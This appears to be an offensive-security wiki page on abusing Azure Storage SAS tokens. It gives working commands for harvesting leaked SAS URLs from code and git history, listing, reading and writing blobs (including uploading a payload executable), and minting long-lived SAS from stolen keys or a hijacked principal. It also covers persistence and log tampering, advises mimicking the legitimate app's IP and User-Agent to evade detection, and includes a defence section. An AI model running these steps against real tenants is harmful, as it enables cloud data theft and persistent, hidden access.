---
title: Azure Storage SAS token abuse
slug: azure-storage-sas-abuse
---

> **TL;DR:** Shared Access Signature (SAS) tokens are URL-embedded credentials for Azure Storage — over-permissioned, long-lived, and rarely logged at issuance. Account-SAS bound to a stolen key gives blob/queue/table access for years; user-delegation SAS is signed by Entra and shorter-lived but inherits the user's role bindings. The most common findings: SAS in code, SAS with `sp=racwdli` and `sv` expiry in 2099, SAS shared via Slack/email that survives the employee leaving.

## What it is
Azure Storage supports three signed-URL families: account-SAS (HMAC over the storage account key), service-SAS (same key, narrower scope), and user-delegation-SAS (Entra-signed via `Get-AzStorageBlobServiceUserDelegationKey`). The signature embeds permissions (`sp=`), scope (`sr=`), validity window (`st=`/`se=`), allowed IPs (`sip=`), protocol (`spr=`), and the signature itself (`sig=`). Anyone with the URL has the access until expiry — there is no revocation other than rotating the storage account key (kills *all* SAS) or expiring the user-delegation key (kills user-delegation SAS only).

## Preconditions / where it applies
- A stolen SAS URL — from source code, browser history, Postman collections, leaked emails, paste sites, exposed config endpoints.
- Or storage account key access (`Microsoft.Storage/storageAccounts/listkeys/action`) — generate fresh SAS yourself.
- Or `Storage Blob Delegator` Entra role plus the ability to read a target's user-delegation key.

## Tradecraft
**Step 1 — Find SAS URLs.**

```bash
# Filesystem
grep -RIn 'core.windows.net.*sig=' . | head
# git history
git log -p | grep -E 'core\.windows\.net.*sig='
# Public buckets
gobuster dns -d blob.core.windows.net -w storage-wordlist.txt    # discover account names
# Postman / Insomnia / VS Code workspace dumps in OneDrive
```

Cloud-config exposure: `/.well-known/`, `/api/config`, `appsettings.json`, frontend `index.html` referencing a SAS URL for client uploads.

**Step 2 — Parse the SAS for power.**

```
https://acmestg.blob.core.windows.net/container/blob?
  sv=2023-01-03&     # storage version
  st=2024-01-01&     # start time
  se=2099-12-31&     # expiry (look for far-future)
  sr=c&              # scope: c=container, b=blob, s=service
  sp=racwdli&        # permissions: read add create write delete list immut
  sip=0.0.0.0-255.255.255.255&  # IP allowlist (or absent = anywhere)
  spr=https&
  sig=URLENCODED
```

`sp=racwdli` + container scope + 2099 expiry = read every blob, delete blobs, list the container indefinitely. The most damaging combo: `sp=racwdl` on a `*` (account-level) SAS — full account access.

**Step 3 — Enumerate without account key.** SAS doesn't authenticate as a user; it just grants the URL bearer.

```bash
# List blobs (sp=l, sr=c)
curl "https://acmestg.blob.core.windows.net/container?restype=container&comp=list&<SAS_PARAMS>"
# Read a blob
curl "https://acmestg.blob.core.windows.net/container/secret.json?<SAS_PARAMS>"
# Write a blob (sp=w/c)
curl -X PUT -H "x-ms-blob-type: BlockBlob" --data-binary @payload.exe \
    "https://acmestg.blob.core.windows.net/container/payload.exe?<SAS_PARAMS>"
```

**Step 4 — Lateral via SAS-stamped CDN.** Many shops front Storage with Azure CDN or Front Door; SAS URLs are pre-baked into HTML/JS. The CDN caches the *response*, so even after expiry, the previously-cached payload is served until purge.

**Step 5 — Pivot to storage account key.** SAS with `sp=racwdli` includes the right to set storage account properties only on service-SAS, not account-SAS. But it usually includes write to `$logs/` and `$metrics/` — useful for log tampering. With list across `$root` you may find a blob containing the account key (people genuinely commit account keys to their own storage).

**Step 6 — Generating new SAS with stolen key.**

```bash
az storage account keys list --account-name acmestg --resource-group rg
# returns key1, key2
az storage container generate-sas --account-name acmestg --name container \
    --permissions racwdli --expiry 2099-12-31 --account-key <KEY>
```

The newly issued SAS doesn't go through Entra; the only audit signal is the `listkeys` action on the storage account.

**Step 7 — User-delegation SAS abuse.** If you compromise an account with `Storage Blob Data Contributor`, you can mint a user-delegation SAS bound to your hijacked principal — looks like normal Entra-authenticated activity until reviewed. Lifetime capped at 7 days; renewable.

```bash
az storage container generate-sas --account-name acmestg --name container \
    --as-user --auth-mode login --permissions racwdli --expiry $(date -d '+7 days' +%Y-%m-%dT%H:%MZ)
```

**Step 8 — Persistence.** Save the SAS URL externally; storage account key rotations are rare (orgs avoid them because they break SAS-bearing apps). User-delegation SAS dies if the user leaves; account-SAS persists across employee turnover.

## Detection and defence
- **Disable shared-key access** on storage accounts: `allowSharedKeyAccess: false`. Forces Entra-auth + user-delegation SAS only. Microsoft recommendation since 2023.
- **Stored access policies** for service-SAS — name the policy and SAS-issue against it; revoking the policy kills the SAS without rotating keys.
- **Tight expiry**: SAS expiry ≤ 8 hours for human-issued, ≤ 7 days for app-issued. Storage Analytics flags `se=` > N.
- **IP allowlist** SAS to known CIDRs (Bastion subnets, app subnets). Public SAS rare in mature shops.
- **Logging**: enable storage account diagnostics (`StorageRead`, `StorageWrite`, `StorageDelete`). The SAS signature appears in logs (`requesterAuthenticationType`) — alert on `SAS` from new IPs.
- Rotate storage account keys quarterly; this kills all account-SAS. Maintenance burden but the only revocation primitive.
- Microsoft Defender for Storage with anomaly detection catches abnormal blob access patterns.

## OPSEC pitfalls
- Storage logs show the SAS signature (truncated) and source IP. Use the same IP/User-Agent the legitimate app uses.
- `$logs/` blob writes are themselves logged; tampering is detectable.
- Defender for Storage's "Anonymous access to a sensitive blob" alert fires on suspicious SAS pulls — esp. for `*.bak`, `*.sql`, `*.pem`.
- A SAS shared via email leaves the URL in Exchange Online — recoverable in IR even after the leak source is removed.

## References
- [Microsoft — Grant limited access to data with SAS](https://learn.microsoft.com/en-us/azure/storage/common/storage-sas-overview) — canonical
- [Microsoft — Disallow shared-key access](https://learn.microsoft.com/en-us/azure/storage/common/shared-key-authorization-prevent) — hardening
- [Orca — SAS token risks](https://orca.security/resources/blog/) — case studies
- [TrustedSec — Hunting SAS tokens](https://www.trustedsec.com/blog/) — discovery patterns

See also: [[managed-identities]], [[az-cli-tokens]], [[azure-key-vault-attacks]], [[entra-prt-cookie-theft]], [[aws-s3-attacks]]
